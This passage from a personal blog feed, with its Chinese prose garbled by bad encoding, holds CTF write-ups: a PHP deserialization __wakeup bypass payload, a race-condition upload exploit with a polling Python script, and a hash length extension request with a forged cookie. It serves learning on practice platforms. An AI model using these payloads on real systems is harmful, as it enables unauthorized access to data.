class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install php5-mysql php5-curl php5-gd php5-intl php-pear php5-imagick php5-imap php5-mcrypt php5-memcache php5-ming php5-ps php5-pspell php5-recode php5-snmp php5-sqlite php5-tidy php5-xmlrpc php5-xsl;</span><br></pre></td></tr></table></figure><p>ä¸ºäº†æ–¹ä¾¿çš„ç®¡ç†æ•°æ®åº“ ï¼Œå®‰è£…phpmyadminã€‚<br>å‘½ä»¤è¡Œè¾“å…¥<code>apt-get install phpmyadmin</code>,ä¸­é—´ä¼šå‡ºç°ä¸€æ¬¡è¾“å…¥ç®¡ç†å¯†ç çš„æç¤ºï¼ŒæŒ‰ç…§æç¤ºè¾“å…¥å³å¯ï¼Œè¿™é‡Œæˆ‘å¥½åƒè¾“äº†3æ¬¡å¯†ç ã€‚ã€‚ã€‚ã€‚<br><img src="https://s1.ax1x.com/2018/05/20/CgyXmn.png" alt="CgyXmn.png"></p><p>å› ä¸ºä¸Šé¢è¿™ä¸œè¥¿é»˜è®¤æ˜¯å®‰è£…åœ¨/usr/share/ä¸‹ï¼Œæ‰€ä»¥ä½ çš„phpmyadminåœ¨/usr/shareä¸‹å¯ä»¥æ‰¾åˆ°<br><img src="https://s1.ax1x.com/2018/05/20/CgyvT0.png" alt="CgyvT0.png"></p><p>ç½‘ä¸Šåˆ°äº†è¿™ä¸€æ­¥æœ‰çš„äººç”¨ç›´æ¥å¤åˆ¶ã€‚ã€‚ã€‚å¯æ˜¯æˆ‘å°è¯•ä¸è¡Œï¼Œåªèƒ½æ˜¾ç¤ºä¸€ç‰‡ç©ºç™½ï¼Œæˆ‘ä¹Ÿä¸èƒ½è§£å†³ï¼Œæœ€ååªèƒ½åˆ æ‰é‡æ¥ã€‚ã€‚ã€‚ã€‚åªèƒ½ç”¨è½¯è¿æ¥çš„æ–¹æ³•ï¼Œå°±æ˜¯ç±»ä¼¼Windowsçš„å¿«æ·æ–¹å¼<br><img src="https://s1.ax1x.com/2018/05/20/Cg6pfU.png" alt="Cg6pfU.png"><br>å›åˆ°<code>/var/www/html</code>ï¼Œè¾“å…¥å‘½ä»¤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -s /usr/share/phpmyadmin phpmyadmin</span><br></pre></td></tr></table></figure><p>æ‰“å¼€æµè§ˆå™¨ï¼Œè¾“å…¥127.0.0.1/phpmyadminï¼Œå‡ºç°äº†ç†Ÿæ‚‰çš„ç•Œé¢<br><img src="https://s1.ax1x.com/2018/05/20/CggyWT.png" alt="CggyWT.png"></p><p>åˆ°è¿™é‡Œç¯å¢ƒå°±åº”è¯¥é…å¥½äº†</p><p>ä¸‹é¢æˆ‘ä»¬å°±ç”¨Xftpè¿™æ¬¾å·¥å…·æŠŠé¢˜ç›®æºç ä¼ ä¸Šå»<br><img src="https://s1.ax1x.com/2018/05/20/CggglF.png" alt="CggglF.png"></p><p>å…ˆè¾“å…¥ifconfigæŸ¥çœ‹ip<br><img src="https://s1.ax1x.com/2018/05/20/Cgg2y4.png" alt="Cgg2y4.png"></p><p>è®©æˆ‘ä»¬è§è¯å¥‡è¿¹ï¼Œå›åˆ°è‡ªå·±çš„æœ¬åœ°çš„æµè§ˆå™¨<br>è¾“å…¥é‚£é“é¢˜ç›®çš„ipï¼Œé¢˜ç›®å¤ç°äº†ï¼Œå•Šå“ˆå“ˆ<br><img src="https://s1.ax1x.com/2018/05/20/Cggfm9.png" alt="Cggfm9.png"><br><img src="https://s1.ax1x.com/2018/05/20/CgghwR.png" alt="CgghwR.png"></p><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>è¿™æ ·æƒ³æƒ³æˆ‘ä»¬å…¶å®è¿˜å¯ä»¥åœ¨æœ¬åœ°è¾“å…¥æœåŠ¡å™¨ipå»æ£€æŸ¥æœåŠ¡å™¨æ˜¯å¦å®‰è£…å¥½å„ç§ç¯å¢ƒã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚å¯èƒ½è¿™å°±æ˜¯åªæœ‰å‘½ä»¤è¡Œæ—¶å€™çš„åšæ³•å§ï¼Ÿï¼Ÿã€‚ã€‚ã€‚ç°åœ¨è¿˜ä¸æ¸…æ¥šï¼Œå¯èƒ½è¿‡æ®µæ—¶é—´ä¼šæœ‰æ›´æ·±åˆ»çš„ç†è§£ã€‚ã€‚</p><p>å¸Œæœ›å­¦åˆ°çš„è¿™äº›ï¼Œåœ¨è·Ÿå¤§é¥¼çš„é¡¹ç›®å¼€å‘è¿‡ç¨‹ä¸­èƒ½æœ‰æ‰€ç”¨é€”å§ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚</p><p>å‚è€ƒæ–‡ç« ï¼š<br><a href="https://jingyan.baidu.com/article/9113f81b24aa9a2b3214c721.html" target="_blank" rel="noopener">https://jingyan.baidu.com/article/9113f81b24aa9a2b3214c721.html</a></p>]]></content>
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç¯å¢ƒéƒ¨ç½² </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>æµ…æcumtå¹³å°ä¸Šçš„ä¸€é“ååºåˆ—åŒ–é¢˜ç›®</title>
      <link href="/cumt-php-fanxuliehua.html"/>
      <url>/cumt-php-fanxuliehua.html</url>
      <content type="html"><![CDATA[<h2 id="å¬è¯´ä½ ä¼šé¢å‘å¯¹è±¡"><a href="#å¬è¯´ä½ ä¼šé¢å‘å¯¹è±¡" class="headerlink" title="å¬è¯´ä½ ä¼šé¢å‘å¯¹è±¡"></a>å¬è¯´ä½ ä¼šé¢å‘å¯¹è±¡</h2><p>è¿™é¢˜ç”¨äº†ååºåˆ—åŒ–çš„ä¸€ä¸ªæ¼æ´ï¼Œå¦‚æœè¿˜ä¸çŸ¥é“ä»€ä¹ˆæ˜¯ååºåˆ—åŒ–ï¼Œå‚è€ƒä¸‹é¢çš„æ–‡ç« <br><a href="http://www.freebuf.com/column/151447.html" target="_blank" rel="noopener">http://www.freebuf.com/column/151447.html</a><br><a id="more"></a></p><p>è¿™ä¸€é¢˜å…¶å®è¿˜æ˜¯å¾ˆç®€å•çš„ï¼Œåªæ˜¯æˆ‘ä¸çŸ¥é“phpååºåˆ—åŒ–çš„ä¸€ä¸ªæ¼æ´ï¼Œé‚£å°±æ˜¯<strong>PHPå½“åºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­è¡¨ç¤ºå¯¹è±¡å±æ€§æ•°çš„å€¼å¤§äºçœŸå®çš„å±æ€§ä¸ªæ•°æ—¶ä¼šè·³è¿‡wakeup()çš„æ‰§è¡Œ</strong></p><p>å› ä¸ºæˆ‘ä¸€å¼€å§‹æ„é€ çš„ç±»æ˜¯è¿™æ ·çš„</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Admin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> Admin();</span><br><span class="line">$a-&gt;file=<span class="string">'flag.php'</span>;</span><br><span class="line">print_r (serilize($a));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç„¶åå¾—åˆ° <code>data=O:5:&quot;Admin&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</code><br>ç„¶åå‘ç°æ˜¯è¿™ä¸ªæ ·å­çš„<br><img src="https://s1.ax1x.com/2018/05/20/CghKa9.png" alt="CghKa9.png"><br>è‚¯å®šæ˜¯åœ¨åºåˆ—åŒ–çš„æ—¶å€™<strong>wakeup()å‡½æ•°åœ¨æé¬¼ï¼Œåé¢åŠ äº†1.ã€‚ã€‚ã€‚<br>å…¶å®è¿™æ®µä»£ç ä¸»è¦æ˜¯åˆ©ç”¨äº†_</strong>destruct()å‡½æ•°æŠŠæ–‡ä»¶å†…å®¹ä¼šæ˜¾ç¤ºå‡ºæ¥<br>äºæ˜¯å°±åˆ©ç”¨ä¸Šé¢è¯´çš„é‚£ä¸€ä¸ªæ¼æ´æ”¹ä¸€ä¸‹payloadï¼šdata=O:5:â€Adminâ€:2:{s:4:â€fileâ€;s:8:â€flag.phpâ€;}<br>flagå°±å‡ºæ¥äº†<br><img src="https://s1.ax1x.com/2018/05/20/CghM5R.png" alt="CghM5R.png"></p><p>çœ‹æ¥è‡ªå·±å¯¹äºååºåˆ—åŒ–è¿˜æ˜¯äº†è§£ç”šå°ï¼Œä¸å¾—ä¸æ‰¿è®¤è‡ªå·±è¿˜æ˜¯ä¸ªèœé¸¡ï¼Œå‚è€ƒåšæ–‡<br><a href="http://www.voidcn.com/article/p-ybezdnbn-bmu.html" target="_blank" rel="noopener">http://www.voidcn.com/article/p-ybezdnbn-bmu.html</a><br><a href="https://mp.weixin.qq.com/s__biz=MzIzOTQ5NjUzOQ%3D%3D&amp;mid=2247483735&amp;idx=1&amp;sn=a886de95750b069c87961ce336fe2f6d&amp;chksm=e9287d63de5ff475a095abe626d386c94509f14298b46b3271c1f9776691ffe2e531024a12f9&amp;mpshare=1&amp;scene=23&amp;srcid=0907F7nrIu4WchffyQBy9jks#rd" target="_blank" rel="noopener">https://mp.weixin.qq.com/s__biz=MzIzOTQ5NjUzOQ%3D%3D&amp;mid=2247483735&amp;idx=1&amp;sn=a886de95750b069c87961ce336fe2f6d&amp;chksm=e9287d63de5ff475a095abe626d386c94509f14298b46b3271c1f9776691ffe2e531024a12f9&amp;mpshare=1&amp;scene=23&amp;srcid=0907F7nrIu4WchffyQBy9jks#rd</a></p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> php </tag>
            
            <tag> ååºåˆ—åŒ– </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>ç®€å•å°ç»“ä¸€ä¸‹Webæ¡ä»¶ç«äº‰çš„é¢˜ç›®</title>
      <link href="/RaceConditionsSummary.html"/>
      <url>/RaceConditionsSummary.html</url>
      <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æœ€è¿‘åœ¨åšæˆ‘ä»¬å­¦æ ¡å¹³å°çš„ä¸€ä¸ªé¢˜ç›®çš„æ—¶å€™ï¼Œçªç„¶å‘ç°äº†ä¸€ä¸ªæ–°çŸ¥è¯†ã€‚ã€‚ã€‚ã€‚ã€‚å¯èƒ½æˆ‘æ˜¯èœé¸¡å§ï¼Œå¤§ä½¬ä»¬è¯·å¿½è§†</p><a id="more"></a><h2 id="æ­£æ–‡"><a href="#æ­£æ–‡" class="headerlink" title="æ­£æ–‡"></a>æ­£æ–‡</h2><p>è¿™ä¸ªçŸ¥è¯†ç‚¹å«æ¡ä»¶ç«äº‰ã€‚ã€‚ã€‚<br>æ¡ä»¶ç«äº‰æ¼æ´æ˜¯ä¸€ç§æœåŠ¡å™¨ç«¯çš„æ¼æ´ï¼Œç”±äºæœåŠ¡å™¨ç«¯åœ¨å¤„ç†ä¸åŒç”¨æˆ·çš„è¯·æ±‚æ—¶æ˜¯å¹¶å‘è¿›è¡Œçš„ï¼Œå› æ­¤ï¼Œå¦‚æœå¹¶å‘å¤„ç†ä¸å½“æˆ–ç›¸å…³æ“ä½œé€»è¾‘é¡ºåºè®¾è®¡çš„ä¸åˆç†æ—¶ï¼Œå°†ä¼šå¯¼è‡´æ­¤ç±»é—®é¢˜çš„å‘ç”Ÿã€‚<br>ç®€å•ç‚¹ç†è§£å°±æ˜¯åœ¨ä½ è¦åšä¸€ä»¶äº‹æƒ…çš„æ—¶å€™ç”¨å¾ˆå¿«çš„é€Ÿåº¦æ’äº†ä¸ªé˜Ÿå¹¶åšäº†å¦å¤–ä¸€ä»¶äº‹ï¼Œä¸€æ—¦è¿™ä»¶äº‹æƒ…æœ‰å®³å°±ä¼šå¯¼è‡´ä¸¥é‡åæœï¼ï¼ï¼</p><p>è¿™é‡Œæœ‰ç¯‡æ–‡ç« è¿˜æ˜¯è®²å¾—å¾ˆå¥½çš„ï¼Œå¯ä»¥å‚è€ƒä¸€ä¸‹ï¼š<br><a href="http://wiki.secbug.net/web_race-condtion.html" target="_blank" rel="noopener">http://wiki.secbug.net/web_race-condtion.html</a></p><p>ä¸‹é¢æ˜¯æœ€è¿‘åšçš„å‡ é“é¢˜ç›®</p><h3 id="cumtå¹³å°ä¸Šçš„-ä¸Šä¼ ä¸‰"><a href="#cumtå¹³å°ä¸Šçš„-ä¸Šä¼ ä¸‰" class="headerlink" title="cumtå¹³å°ä¸Šçš„ ä¸Šä¼ ä¸‰"></a>cumtå¹³å°ä¸Šçš„ <a href="http://202.119.201.199/challenge/web/uploadfile/" target="_blank" rel="noopener">ä¸Šä¼ ä¸‰</a></h3><p>è¿™ä¸€ä¸ªé¢˜ç›®åœ¨å‰ä¸¤ä¸ªé¢˜ç›®ç»•è¿‡çš„åŸºç¡€ä¸Š<br>å‘ç°è¦ç»•è¿‡åå°é»‘åå•ï¼Œä½†æ˜¯æˆ‘ä»¬çŸ¥é“é»‘åå•ä¸€èˆ¬éƒ½ä¸å®‰å…¨ï¼Œæˆ‘ä»¬ä¸€èˆ¬ç”¨ç™½åå•ã€‚ã€‚ã€‚ã€‚ã€‚<br>æ—¢ç„¶ä»–è¯´phpåç¼€æ˜¯é»‘åå•ï¼Œæˆ‘ä»¬å°è¯•ä¸€ä¸‹phpçš„åˆ«åphp1,php2â€¦.å½“ä¸€ç›´è¯•åˆ°phtmlçš„æ—¶å€™ï¼ŒæŠ“çš„åŒ…å°±æœ‰åŒºåˆ«äº†ï¼Œåˆšå¼€å§‹è¿˜ä¸çŸ¥é“ï¼Œè¿™é‡Œæƒ³å¹²å•¥ï¼Œæ­¤å¤„æ„Ÿè°¢éª†éª†å¤§ä½¬ã€‚è®©æˆ‘çŸ¥é“è¿™å«æ¡ä»¶ç«äº‰<br><img src="https://s1.ax1x.com/2018/05/20/CggldI.png" alt="CggldI.png"><br>äºæ˜¯æœ‰äº†ä¸‹é¢çš„æ“ä½œ<br>æŠ“åŒ…å‘é€åˆ°Intruderæ¨¡å—å¼€20çº¿ç¨‹ä¸æ–­å‘åŒ…ï¼Œç„¶åå†™ä¸€ä¸ªpythonè„šæœ¬ä¸æ–­å»è®¿é—®é‚£ä¸ªæ–‡ä»¶ï¼Œå…¶å®è¿™ä¸ªè®¿é—®ä¹Ÿå¯ä»¥ç”¨bpå®Œæˆã€‚ã€‚ã€‚<br><img src="https://s1.ax1x.com/2018/05/20/CggGJf.png" alt="CggGJf.png"><br>ä¸‹é¢æ˜¯pythonè„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">'ä½ çš„æ–‡ä»¶è·¯å¾„'</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">r = requests.get(url)</span><br><span class="line"><span class="keyword">if</span> <span class="string">'moctf'</span> <span class="keyword">in</span>  r.text:</span><br><span class="line"><span class="keyword">print</span> r.text</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2018/05/20/CggJW8.png" alt="CggJW8.png"></p><h3 id="moctfä¸Šçš„-æ²¡æ—¶é—´è§£é‡Š"><a href="#moctfä¸Šçš„-æ²¡æ—¶é—´è§£é‡Š" class="headerlink" title="moctfä¸Šçš„ æ²¡æ—¶é—´è§£é‡Š"></a>moctfä¸Šçš„<a href="https://119.23.73.3:5006/web2/index2.php" target="_blank" rel="noopener"> æ²¡æ—¶é—´è§£é‡Š</a></h3><p>è¿™ä¸€é¢˜ç»™äº†ä¸‰ä¸ªæç¤ºï¼Œä½†æ˜¯æœ€åè€ƒçš„ç‚¹è¿˜æ˜¯æ¡ä»¶ç«äº‰<br>é¦–å…ˆçš„302è¿™ä¸ªé—®é¢˜æœ€å¥½çš„çš„è§£å†³æ–¹æ¡ˆå°±æ˜¯æŠ“åŒ…<br>æŠ“åŒ…å‘ç°<br><img src="https://s1.ax1x.com/2018/05/20/CggNQg.png" alt="CggNQg.png"><br>ç„¶åè®¿é—®æ˜¯ä¸€ä¸ªæ–‡ä»¶çš„ä¸Šä¼ é¡µé¢ï¼Œè¾“å…¥çš„å†…å®¹ä¸ä½ ä¼ é€çš„å†…å®¹ä¸€è‡´ã€‚ä»urlå¯ä»¥çœ‹å¾—å‡ºæ¥<br><img src="https://s1.ax1x.com/2018/05/20/Cggwes.png" alt="Cggwes.png"><br>äºæ˜¯éšä¾¿å†™ç‚¹ä¸œè¥¿ä¸Šä¼ ï¼Œå½“ç„¶ä½ ä¹Ÿå¯ä»¥å†™ä¸€å¥è¯æœ¨é©¬ã€‚ã€‚ã€‚ã€‚<br>å‡ºç°æ–‡ä»¶è·¯å¾„ï¼Œè€Œä¸”æ”¹å˜æ–‡ä»¶åå­—ä¸Šä¼ æ–‡ä»¶è·¯å¾„è¿˜æ˜¯ä¸€æ ·çš„ï¼Œäºæ˜¯å°±å°è¯•è®¿é—®<br><img src="https://s1.ax1x.com/2018/05/20/Cgg0wn.png" alt="Cgg0wn.png"><br>å‡ºç°too slowå­—æ ·ã€‚ã€‚ã€‚è·Ÿcumtçš„é‚£ä¸€é¢˜çš„åˆ é™¤å¾ˆæ˜¯ç±»ä¼¼äº†<br>ç„¶åæˆ‘ä»¬å°±ç”¨bpæŠŠå®ƒè·‘å‡ºæ¥ï¼Œè™½ç„¶æœ€åçš„æç¤ºæ˜¯è„šæœ¬ï¼Œä½†æ˜¯ä¸æƒ³å†™äº†ï¼Œå°±ç›´æ¥ç”¨bpå§<br><img src="https://s1.ax1x.com/2018/05/20/CggrF0.png" alt="CggrF0.png"><br>æœ€åå¾—åˆ°flagã€‚ã€‚ã€‚ã€‚<br><img src="https://s1.ax1x.com/2018/05/20/CggsYV.png" alt="CggsYV.png"></p><h2 id="æœ€åå†åæ§½ä¸€ä¸¤å¥è¯"><a href="#æœ€åå†åæ§½ä¸€ä¸¤å¥è¯" class="headerlink" title="æœ€åå†åæ§½ä¸€ä¸¤å¥è¯"></a>æœ€åå†åæ§½ä¸€ä¸¤å¥è¯</h2><p>ä»Šå¤©çš„N1CTFè‡ªå·±å»åˆ’äº†ä¸€æ³¢æ°´ï¼Œå¿ƒç´¯ï¼Œåªä¼šåšä¸€é“ç­¾åˆ°é¢˜ï¼Œçœ‹æ¥è¿˜æ˜¯ä¸€ä¸ªæ¸£æ¸£ï¼Œå¾—ç»§ç»­è™šå¿ƒå­¦ä¹ å•Šï¼ï¼ï¼</p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>è®°å½•ä¸€ä¸‹Hashé•¿åº¦æ‰©å±•æ”»å‡»çš„å‡ ä¸ªé¢˜ç›®</title>
      <link href="/hash-length-attack.html"/>
      <url>/hash-length-attack.html</url>
      <content type="html"><![CDATA[<p>æœ€è¿‘åšäº†å‡ ä¸ªé¢˜ç›®ï¼Œåˆå­¦åˆ°æ–°çš„çŸ¥è¯†ç‚¹ï¼Œæ˜¯æœ‰å…³Hashé•¿åº¦æ‰©å±•æ”»å‡»<br>å‚è€ƒäº†ä¸€æ³¢Pç‰›çš„åšå®¢è¿˜æœ‰æˆ‘ä»¬å­¦æ ¡çš„åšå®¢ï¼š<br><a href="http://www.cnblogs.com/pcat/p/5478509.html" target="_blank" rel="noopener">http://www.cnblogs.com/pcat/p/5478509.html</a><br><a href="http://www.bxsteam.xyz/2017/05/23/hash%e9%95%bf%e5%ba%a6%e6%89%a9%e5%b1%95%e6%94%bb%e5%87%bb/" target="_blank" rel="noopener">http://www.bxsteam.xyz/2017/05/23/hash%e9%95%bf%e5%ba%a6%e6%89%a9%e5%b1%95%e6%94%bb%e5%87%bb/</a></p><a id="more"></a><h1 id="æ­£æ–‡"><a href="#æ­£æ–‡" class="headerlink" title="æ­£æ–‡"></a>æ­£æ–‡</h1><h2 id="å®éªŒå§-è®©æˆ‘è¿›å»"><a href="#å®éªŒå§-è®©æˆ‘è¿›å»" class="headerlink" title="å®éªŒå§ è®©æˆ‘è¿›å»"></a>å®éªŒå§ è®©æˆ‘è¿›å»</h2><p>æ—¢ç„¶è¯´æ˜¯adminæ‰èƒ½è¿›å»ï¼Œé‚£æˆ‘å°±å…ˆæŠ“ä¸ªåŒ…ï¼Œçœ‹ä¸€ä¸‹åŒ…é‡Œé¢æ˜¯å¦åˆè¦æ”¹çš„ä¸œè¥¿ã€‚ã€‚ã€‚ã€‚<br>å‘ç°æœ‰ä¸€ä¸ªsource=0ï¼Œæ¯«ä¸çŠ¹è±«æŠŠå®ƒæ”¹ä¸º1ï¼Œ<br><img src="https://s1.ax1x.com/2018/05/20/CghlP1.png" alt="CghlP1.png"><br>å‘åŒ…è·å¾—æºä»£ç </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if (urldecode($username) === &quot;admin&quot; &amp;&amp; urldecode($password) != &quot;admin&quot;) &#123;</span><br><span class="line">        if ($COOKIE[&quot;getmein&quot;] === md5($secret . urldecode($username . $password))) &#123;</span><br><span class="line">            echo &quot;Congratulations! You are a registered user.\n&quot;;</span><br><span class="line">            die (&quot;The flag is &quot;. $flag);</span><br></pre></td></tr></table></figure><p>çœ‹ä¸€ä¸‹æºä»£ç å‘ç°è¿™é‡Œæœ‰urldecodeä½†æ˜¯ä¸ä¼šå¤ªå½±å“ï¼Œæœ€æœ€å…³é”®çš„åº”è¯¥æ˜¯<code>md5($secret . urldecode($username . $password))</code>è¿™ä¸ªä¸œè¥¿</p><p><img src="https://s1.ax1x.com/2018/05/20/Cgh18x.png" alt="Cgh18x.png"></p><p>å…³é”®ä»£ç å°±è¿™ä¸€éƒ¨åˆ†è€Œå·²ï¼Œå…¶ä½™çš„ä»€ä¹ˆsetcookieéƒ½æ²¡å•¥ç”¨ï¼Œå†çœ‹çœ‹åŒ…é‡Œé¢çš„å†…å®¹ï¼Œå‘ç°è¿™ä¸ªç‚¹ï¼Œè°·æ­Œæœä¸€æ³¢å‘ç°Pç‰›çš„è§£æ<br><a href="https://imgchr.com/i/Cgh8xK" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/05/20/Cgh8xK.md.png" alt="Cgh8xK.md.png"></a><br>è€ŒåæŒ‰ç…§ä»–çš„æ­¥éª¤å®‰è£…äº†hashpumpï¼Œæœ€åæŠŠé¢˜ç›®å®Œæˆ<br>å…ˆæ˜¯æ–°çš„ç­¾åï¼ŒæŠŠå®ƒè®¾ç½®åˆ°<code>cookie</code>çš„<code>getmein</code>é‡Œã€‚<br>ç¬¬äºŒä¸ªå…ˆæŠŠ\xæ›¿æ¢ä¸º%åï¼Œpostæäº¤</p><p>æˆ‘æœ€åå‘çš„åŒ…</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /web/kzhan.php HTTP/1.1</span><br><span class="line">Host: ctf5.shiyanbar.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:58.0) Gecko/20100101 Firefox/58.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://ctf5.shiyanbar.com/web/kzhan.php</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 227</span><br><span class="line">Cookie: sample-hash=571580b26c65f306376d4f64e53cb5c7; source=1; Hm_lvt_34d6f7353ab0915a4c582e4516dffbc3=1520492842,1520518767,1520572017; Hm_cv_34d6f7353ab0915a4c582e4516dffbc3=1*visitor*132367%2CnickName%3A0verWatch; Hm_lpvt_34d6f7353ab0915a4c582e4516dffbc3=1520584378; PHPSESSID=qljr4nu3o68169kr8ejb2htp87;getmein=7db18a2831cdab27425f299ca09f034e;</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">username=admin&amp;password=admin%2580%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%25c8%2500%2500%2500%2500%2500%2500%2500abc</span><br></pre></td></tr></table></figure><h2 id="cumtå¹³å°ä¸Šçš„ä¸€é“é¢˜ç›®"><a href="#cumtå¹³å°ä¸Šçš„ä¸€é“é¢˜ç›®" class="headerlink" title="cumtå¹³å°ä¸Šçš„ä¸€é“é¢˜ç›®"></a>cumtå¹³å°ä¸Šçš„ä¸€é“é¢˜ç›®</h2><h3 id="is-hash-safe"><a href="#is-hash-safe" class="headerlink" title="is hash safe??"></a>is hash safe??</h3><p>ç‚¹è¿›å»å‘ç°è¦adminæ‰èƒ½çœ‹ï¼Œå¸¸è§„æ“ä½œæŠ“åŒ…ï¼Œçœ‹é‡Œé¢æœ‰æ²¡æœ‰è¦æ”¹çš„ï¼Œæœä¸å…¶ç„¶ï¼ŒæŠŠguestæ”¹ä¸ºadminå‘ç°æ²¡å•¥ç”¨ã€‚ã€‚ã€‚ã€‚<br><img src="https://s1.ax1x.com/2018/05/20/CghJKO.png" alt="CghJKO.png"></p><p>ç„¶åå†çœ‹çœ‹é¡µé¢æºä»£ç å•¥éƒ½æ²¡æœ‰ï¼Œé‚£åº”è¯¥å°±æ˜¯æºç æ³„éœ²äº†ï¼Œå°è¯•.swp<br>å‘ç°æ³„éœ²æ–‡ä»¶<br>æ”¾è¿›kalié‡Œé¢ç”¨vim -r å‘½ä»¤å¤åŸæºä»£ç æ–‡ä»¶<br>å¾—åˆ°æºç <br><img src="https://s1.ax1x.com/2018/05/20/CghYrD.png" alt="CghYrD.png"></p><p>è·Ÿé‚£ä¸ªå®éªŒå§çš„é¢˜ç›®å¾ˆç›¸ä¼¼ï¼Œä½†åˆæœ‰ä¸åŒï¼Œå®éªŒå§é‚£ä¸€é¢˜æ˜¯æœ‰ä¸¤ä¸ªå­—ç¬¦ä¸²è¿æ¥ç¬¦ï¼Œç„¶åä½¿å…¶é•¿åº¦ä¸º20ä½ï¼Œå‘ç°roleæ˜¯guest<br>äºæ˜¯æˆ‘ä»¬æ¥hashpumpä¸€æ³¢ï¼Œæ ¹æ®æç¤ºå¯†æ–‡é•¿åº¦ä¸º13ï¼Œå¹¶ä¸”è¦ç»•è¿‡adminå­—ç¬¦ä¸²ï¼Œäºæ˜¯å¾—åˆ°<br><a href="https://imgchr.com/i/Cghtqe" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/05/20/Cghtqe.md.png" alt="Cghtqe.md.png"></a><br>æŠ“åŒ…å‘é€ï¼Œå¾—åˆ°flag<br><img src="https://s1.ax1x.com/2018/05/20/CghUVH.png" alt="CghUVH.png"></p><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>æ€ä¹ˆè¯´å‘¢ï¼Œè¿™å‡ ä¸ªé¢˜å¥½åƒåªè€ƒäº†å·¥å…·æ€ä¹ˆä½¿ç”¨ï¼Œä½†æ˜¯ä¸€äº›å¿…è¦çš„æ¡ä»¶è¿˜æ˜¯è¦è‡ªå·±æ‰¾å‡ºæ¥çš„ï¼Œé€šè¿‡æŠ“åŒ…ä¹‹ç±»çš„ï¼Œè¿˜æœ‰ä¸€ç‚¹ç‚¹çš„ä»£ç å®¡è®¡ï¼Œæœ‰äº›åœ°æ–¹è¿˜æ˜¯æœ‰äº›ä¸æ‡‚ï¼Œè¿‡æ®µæ—¶é—´å†ç»§ç»­å®Œå–„ä¸€ä¸‹è‡ªå·±çš„ä½“ä¼šå§ã€‚ã€‚ã€‚ã€‚</p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>ç®€å•å°ç»“ä¸€ä¸‹moctfçš„ä¸‰é“webé¢˜</title>
      <link href="/moctf-web.html"/>
      <url>/moctf-web.html</url>
